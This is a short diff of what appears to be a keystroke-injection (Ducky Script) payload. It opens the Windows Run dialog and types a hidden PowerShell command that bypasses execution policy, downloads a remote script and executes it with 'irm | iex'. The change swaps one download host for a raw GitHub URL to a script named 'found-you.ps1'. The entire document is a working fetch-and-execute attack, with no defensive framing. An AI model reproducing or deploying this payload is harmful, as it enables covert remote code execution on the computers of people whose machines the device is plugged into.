@@ -12,5 +12,5 @@ REM     ------------------------------------------------------------------------
 
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Ep Bypass irm jakoby.lol/yzb | iex
+STRING powershell -w h -NoP -NonI -Ep Bypass irm https://raw.githubusercontent.com/TornetMarket/WeFoundYou/refs/heads/main/found-you.ps1 | iex
 ENTER
